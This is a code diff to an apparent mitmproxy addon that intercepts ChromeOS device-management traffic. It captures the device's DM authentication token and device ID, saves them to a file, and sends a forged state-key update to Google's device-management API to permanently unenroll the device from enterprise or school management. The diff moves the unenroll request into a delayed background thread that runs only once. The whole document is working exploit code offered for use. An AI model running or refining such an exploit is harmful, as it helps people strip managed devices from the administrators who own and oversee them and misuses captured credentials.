@@ -6,6 +6,7 @@ import logging
 import os
 import struct
 import sys
+import threading
 import time
 import requests
 
@@ -28,6 +29,7 @@ class DMProxy:
         self.master = master
         self.permanent = permanent
         self.psm_response = (Path(__file__).resolve().parent / "payload" / "psm_response.bin").read_bytes()
+        self.unenroll_started = False
 
     def request(self, flow: http.HTTPFlow) -> None:
         if "/devicemanagement/" not in flow.request.path:
@@ -58,38 +60,48 @@ class DMProxy:
             return
 
         if self.permanent and req_type == "policy":
+            if self.unenroll_started:
+                return
+
+            self.unenroll_started = True
             dmtoken = flow.request.headers["Authorization"].split("token=")[1]
             deviceid = flow.request.query.get("deviceid")
 
             print(f"[proxy] got dmtoken: {dmtoken}")
             Path("dmtoken.txt").write_text(f"{deviceid}:{dmtoken}")
 
-            policy_fetch_request = proto.PolicyFetchRequest()
-            policy_fetch_request.policy_type = "google/chromeos/device"
+            def do_unenroll():
+                print("[proxy] waiting 1 minute before sending state key update...")
+                time.sleep(60)
 
-            request = proto.DeviceManagementRequest()
-            request.policy_request.requests.append(policy_fetch_request)
-            request.device_state_key_update_request.server_backed_state_keys.extend(os.urandom(32) for _ in range(5))
+                policy_fetch_request = proto.PolicyFetchRequest()
+                policy_fetch_request.policy_type = "google/chromeos/device"
 
-            response = requests.post(
-                f"https://m.google.com/devicemanagement/data/api?apptype=Chrome&deviceid={deviceid}&devicetype=2&request=policy",
-                headers={
-                    "Authorization": f"GoogleDMToken token={dmtoken}",
-                    "Content-Type": "application/protobuf",
-                },
-                data=request.SerializeToString(),
-            )
+                request = proto.DeviceManagementRequest()
+                request.policy_request.requests.append(policy_fetch_request)
+                request.device_state_key_update_request.server_backed_state_keys.extend(os.urandom(32) for _ in range(5))
 
-            data = proto.DeviceManagementResponse()
-            data.ParseFromString(response.content)
+                response = requests.post(
+                    f"https://m.google.com/devicemanagement/data/api?apptype=Chrome&deviceid={deviceid}&devicetype=2&request=policy",
+                    headers={
+                        "Authorization": f"GoogleDMToken token={dmtoken}",
+                        "Content-Type": "application/protobuf",
+                    },
+                    data=request.SerializeToString(),
+                )
 
-            if data.error_message:
-                print(f"unenrollment failed: {data.error_message}")
-                return
+                data = proto.DeviceManagementResponse()
+                data.ParseFromString(response.content)
 
-            print(f"successfully unenrolled device {deviceid}")
-            print("[proxy] you may now powerwash the device")
-            self.master.shutdown()
+                if data.error_message:
+                    print(f"unenrollment failed: {data.error_message}")
+                    return
+
+                print(f"successfully unenrolled device {deviceid}")
+                print("[proxy] you may now powerwash the device")
+                self.master.shutdown()
+
+            threading.Thread(target=do_unenroll, daemon=True).start()
 
 if args.enroll:
     dmtoken_file = Path("dmtoken.txt")
